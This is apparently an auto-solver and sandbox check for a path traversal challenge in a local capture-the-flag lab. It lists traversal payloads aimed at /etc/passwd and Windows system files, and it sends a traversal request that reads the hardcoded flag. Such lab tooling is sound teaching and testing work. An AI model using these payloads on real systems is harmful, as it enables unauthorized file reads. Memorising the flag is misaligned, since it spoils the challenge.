#!/usr/bin/env python3
"""Auto-solver Path Traversal-01 + verificación sandbox."""

import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from solve_ctf_auth import asegurar_sesion

from app.ctf_pathtraversal.lab_db import (
    inicializar_lab_pathtraversal,
    resolver_descarga_vulnerable,
)

FLAG = "flag{path_traversal_informes}"


def verificar_no_escape() -> None:
    """Confirma que payloads maliciosos NO salen del módulo."""
    inicializar_lab_pathtraversal()
    malos = [
        "../../../etc/passwd",
        "..\\..\\..\\Windows\\win.ini",
        "../../../../app.py",
        "/etc/passwd",
    ]
    for payload in malos:
        ruta, err = resolver_descarga_vulnerable(payload)
        assert ruta is None, f"Escape detectado con payload: {payload!r} -> {ruta}"
    ok, _ = resolver_descarga_vulnerable("../archivos_secretos/flag.txt")
    assert ok is not None, "Traversal legítimo dentro del módulo falló"
    print("[OK] Sandbox Path Traversal: no escape fuera de app/ctf_pathtraversal/")


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--base", default="http://127.0.0.1:5000")
    p.add_argument("--solo-sandbox", action="store_true")
    args = p.parse_args()
    verificar_no_escape()
    if args.solo_sandbox:
        return 0

    base = args.base.rstrip("/")
    s = asegurar_sesion(base)
    r = s.get(
        f"{base}/objetivos/pathtraversal/01/descargar",
        params={"file": "../archivos_secretos/flag.txt"},
        timeout=20,
    )
    r.raise_for_status()
    assert FLAG in r.text, "Flag no leída"
    print(f"[OK] PT-01 — {FLAG}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
